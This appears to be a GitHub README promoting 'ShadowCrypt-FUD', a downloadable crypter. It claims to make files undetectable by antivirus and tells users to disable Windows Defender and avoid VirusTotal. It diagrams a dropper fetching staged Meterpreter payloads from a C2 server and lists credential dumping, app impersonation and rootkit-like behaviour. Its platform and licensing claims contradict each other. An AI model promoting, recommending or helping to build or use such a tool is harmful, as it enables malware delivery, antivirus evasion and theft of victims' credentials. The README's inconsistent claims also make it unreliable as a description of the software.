# ShadowCrypt-FUD
<div class="center" align="center"><center><img src="https://i.ibb.co/7QTgfRK/logo.png" width="3200" alt=""/></center></div>

----
<div align="center"><strong>🟦🟦THIS IS A NEW PROJEC FEEL FREE TO CONTRIBUTE TO THIS PROJECT IF YOU HAVE ANY FURTHER IDEAS.🟦🟦</strong></div>

----
ShadowCrypt is a fully undetectable crypter that bypasses all antivirus software on Windows.

**Warning: Do not share or distribute this program without providing proper credit to this repository. Unauthorized sharing without attribution is prohibited.**

**➡️This project is not open source because it is intended to prevent unauthorized monetization.⬅️**

**Description**
----
ShadowCrypt is designed to be a fully undetectable (FUD) crypter that bypasses all antivirus software. I regularly update the stub to ensure it remains FUD, and in return for my effort, I kindly ask that you do not upload it to VirusTotal. Let's work together to maintain the only FUD crypter on GitHub.

Originally developed for personal use, I've simplified ShadowCrypt to make it accessible to everyone. It's easy to use and comes pre-compiled. While primarily designed for Windows, I plan to release the source code and make modifications for Linux users (note: it currently doesn't work with Wine).

**Usage/Install**
----
**You may need to turn off your windows Defender!**
1. **Download**: [Click here to download ShadowCrypt]
2. **Extract the zip file**
3. **Run** ShadowCrypt.exe.
4. **Set the input** (the path to the file you want to make undetectable) and **output** (the directory where the FUD file will be generated).
5. Click the "**CRYPT NOW**" button. The process may take a few minutes.
Enjoy your fully undetectable crypted file!

**How it Works**
----
ShadowCrypt uses advanced AES256 and XOR encryption to obfuscate your file's bytes, encrypting them in memory and decrypting them at runtime.
# Scheme of concept
```
        +-----------------+
        |   Generated     |
        |    Binary       |
        +-----------------+
                 |
                 | Execute
                 |
                 v
        +------------------+
        |oBFUSCATED dropper|
        +------------------+
                 |
                 | GET request
                 |
                 v
        +-----------------+
        |                 |
        |    C2 SERVER    |
        |                 |
        +-----------------+
                 |
                 | Download
                 |
                 v
        +-----------------+
        |    Meterpreter  |
        |   Staged Payload|
        |    (Stage 1)    |
        +-----------------+
                 |
                 | Download
                 |
                 v
        +-----------------+
        |    C2 Server    |
        +-----------------+
                 |
                 | Socket
                 |
                 v
        +-----------------+
        |    Meterpreter  |
        |   Staged Payload|
        |    (Stage 2)    |
        +-----------------+

```
## Features
- Staged payloads
- FUD (for macOS)
- Cloacks as an official app (Microsoft, ExpressVPN etc)
- Dumps; Sys info, Browser History, Logins, ssh/aws/azure/gcloud creds, clipboard content, local users etc. (more on Cedric Owens swiftbelt)
- Encrypted communications
- Rootkit-like Behaviour
- Every Backdoor generated is entirely unique
- ngrok support

**License**
----
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

**Disclaimer**
----
<div align="center"><strong>⚠️ DO NOT USE THIS TOOL FOR ILLEGAL PURPOSES ⚠️</strong></div>
It is the end user's responsibility to comply with all applicable local, state, and federal laws. The developers assume no liability and are not responsible for any misuse or damage caused by this program.

**Thank You**
----
Enjoy using ShadowCrypt!
